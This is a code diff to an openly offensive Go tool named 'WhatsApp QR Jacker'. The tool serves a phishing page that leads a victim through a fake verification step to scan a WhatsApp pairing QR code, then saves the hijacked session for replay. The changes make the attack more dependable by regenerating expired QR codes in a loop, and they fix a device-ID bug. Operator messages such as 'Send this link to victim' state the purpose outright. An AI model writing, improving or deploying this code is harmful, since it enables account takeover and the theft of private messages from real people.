@@ -126,60 +126,6 @@ func launchAttack(cfg attackCfg) {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	device := newDevice()
-	cli := whatsmeow.NewClient(device, waLog.Noop)
-
-	qrChan, err := cli.GetQRChannel(ctx)
-	if err != nil {
-		fmt.Printf("%s[!] Failed to get QR channel: %v%s\n", utils.Red, err, utils.Reset)
-		utils.PauseForInput()
-		return
-	}
-
-	err = cli.Connect()
-	if err != nil {
-		fmt.Printf("%s[!] Failed to connect: %v%s\n", utils.Red, err, utils.Reset)
-		utils.PauseForInput()
-		return
-	}
-
-	go func() {
-		for item := range qrChan {
-			switch item.Event {
-			case whatsmeow.QRChannelEventCode:
-				currentAttack.mu.Lock()
-				currentAttack.qrCode = item.Code
-				currentAttack.mu.Unlock()
-			case whatsmeow.QRChannelSuccess.Event:
-				currentAttack.mu.Lock()
-				currentAttack.paired = true
-				currentAttack.sessionData = cli.Store
-				currentAttack.mu.Unlock()
-				saveCapturedSession(cli.Store)
-				cancel()
-				return
-			case whatsmeow.QRChannelEventError:
-				currentAttack.mu.Lock()
-				if item.Error != nil {
-					currentAttack.errorMsg = item.Error.Error()
-				}
-				currentAttack.mu.Unlock()
-			case whatsmeow.QRChannelClientOutdated.Event:
-				currentAttack.mu.Lock()
-				currentAttack.errorMsg = "whatsmeow client outdated, please update"
-				currentAttack.mu.Unlock()
-			case whatsmeow.QRChannelTimeout.Event:
-				currentAttack.mu.Lock()
-				currentAttack.errorMsg = "pairing timeout"
-				currentAttack.mu.Unlock()
-			case whatsmeow.QRChannelErrUnexpectedEvent.Event:
-				currentAttack.mu.Lock()
-				currentAttack.errorMsg = "unexpected state (already paired?)"
-				currentAttack.mu.Unlock()
-			}
-		}
-	}()
-
 	mux := http.NewServeMux()
 	mux.HandleFunc("/", verifyHandler)
 	mux.HandleFunc("/qr", qrPageHandler)
@@ -203,44 +149,105 @@ func launchAttack(cfg attackCfg) {
 	attackURL := fmt.Sprintf("http://%s:%d", ip, cfg.Port)
 	localURL := fmt.Sprintf("http://127.0.0.1:%d", cfg.Port)
 
-	fmt.Printf("\n%s[+] WhatsApp QR Jacker running%s\n", utils.Green, utils.Reset)
-	fmt.Printf("%s[+] Send this link to victim: %s%s\n", utils.Yellow, attackURL, utils.Reset)
-	fmt.Printf("%s[+] Open locally to test:  %s%s\n", utils.Yellow, localURL, utils.Reset)
-	fmt.Printf("%s[+] Victim opens link → sees problem screen → clicks Verify → sees QR → scans with phone → session captured%s\n", utils.Yellow, utils.Reset)
-	fmt.Printf("%s[+] Waiting for victim to scan QR and pair...\n\n%s", utils.Yellow, utils.Reset)
-
 	srv := &http.Server{Handler: mux}
 	go srv.Serve(listener)
 
 	start := time.Now()
-	timeout := 10 * time.Minute
+	totalTimeout := 10 * time.Minute
 	sessionCaptured := false
-	var finalErrMsg string
 
-	for time.Since(start) < timeout {
+	for time.Since(start) < totalTimeout && !sessionCaptured {
+		device := newDevice()
+		cli := whatsmeow.NewClient(device, waLog.Noop)
+
+		qrChan, err := cli.GetQRChannel(ctx)
+		if err != nil {
+			fmt.Printf("%s[!] Failed to get QR channel: %v%s\n", utils.Red, err, utils.Reset)
+			break
+		}
+
+		err = cli.Connect()
+		if err != nil {
+			fmt.Printf("%s[!] Failed to connect: %v%s\n", utils.Red, err, utils.Reset)
+			break
+		}
+
 		currentAttack.mu.Lock()
-		paired := currentAttack.paired
-		errMsg := currentAttack.errorMsg
+		currentAttack.qrCode = ""
+		currentAttack.errorMsg = ""
 		currentAttack.mu.Unlock()
 
-		if errMsg != "" {
-			finalErrMsg = errMsg
-			fmt.Printf("\n%s[!] Error: %s%s\n", utils.Red, errMsg, utils.Reset)
+		fmt.Printf("\n%s[+] WhatsApp QR Jacker running%s\n", utils.Green, utils.Reset)
+		fmt.Printf("%s[+] Send this link to victim: %s%s\n", utils.Yellow, attackURL, utils.Reset)
+		fmt.Printf("%s[+] Open locally to test:  %s%s\n", utils.Yellow, localURL, utils.Reset)
+		fmt.Printf("%s[+] QR Code ready on /qr page%s\n", utils.Yellow, utils.Reset)
+
+		done := make(chan struct{})
+		var closeOnce sync.Once
+		go func() {
+			for item := range qrChan {
+				switch item.Event {
+				case whatsmeow.QRChannelEventCode:
+					currentAttack.mu.Lock()
+					currentAttack.qrCode = item.Code
+					currentAttack.mu.Unlock()
+				case whatsmeow.QRChannelSuccess.Event:
+					currentAttack.mu.Lock()
+					currentAttack.paired = true
+					currentAttack.sessionData = cli.Store
+					currentAttack.mu.Unlock()
+					saveCapturedSession(cli.Store)
+					sessionCaptured = true
+					closeOnce.Do(func() { close(done) })
+					return
+				case whatsmeow.QRChannelEventError:
+					currentAttack.mu.Lock()
+					if item.Error != nil {
+						currentAttack.errorMsg = item.Error.Error()
+					}
+					currentAttack.mu.Unlock()
+				case whatsmeow.QRChannelClientOutdated.Event:
+					currentAttack.mu.Lock()
+					currentAttack.errorMsg = "whatsmeow client outdated, please update"
+					currentAttack.mu.Unlock()
+					closeOnce.Do(func() { close(done) })
+					return
+				case whatsmeow.QRChannelTimeout.Event:
+					currentAttack.mu.Lock()
+					currentAttack.errorMsg = ""
+					currentAttack.qrCode = ""
+					currentAttack.mu.Unlock()
+					closeOnce.Do(func() { close(done) })
+					return
+				case whatsmeow.QRChannelErrUnexpectedEvent.Event:
+					currentAttack.mu.Lock()
+					currentAttack.errorMsg = ""
+					currentAttack.qrCode = ""
+					currentAttack.mu.Unlock()
+					closeOnce.Do(func() { close(done) })
+					return
+				}
+			}
+			closeOnce.Do(func() { close(done) })
+		}()
+
+		select {
+		case <-done:
+		case <-time.After(2 * time.Minute):
+		}
+		cli.Disconnect()
+		if sessionCaptured {
 			break
 		}
-		if paired {
-			sessionCaptured = true
-			break
-		}
-		time.Sleep(500 * time.Millisecond)
+		fmt.Printf("%s[*] QR expired, generating new code...%s\n", utils.Yellow, utils.Reset)
+		time.Sleep(2 * time.Second)
 	}
 
 	srv.Close()
-	cli.Disconnect()
 
 	if sessionCaptured {
 		fmt.Printf("\n%s[+] Session captured! Use it with option 3 (Replay).%s\n", utils.Green, utils.Reset)
-	} else if finalErrMsg == "" {
+	} else {
 		fmt.Printf("\n%s[!] No session captured within timeout.%s\n", utils.Yellow, utils.Reset)
 	}
 	utils.PauseForInput()
@@ -547,8 +554,9 @@ func deviceFromSession(s *sessionData) *store.Device {
 		d.SignedPreKey = preKey
 	}
 	if s.JIDUser != "" && s.JIDServer != "" {
-		d.ID = types.NewJID(s.JIDUser, s.JIDServer)
-		d.ID.Device = s.JIDDevice
+		jid := types.NewJID(s.JIDUser, s.JIDServer)
+		jid.Device = s.JIDDevice
+		d.ID = &jid
 	}
 
 	d.SetAllStores(noop)
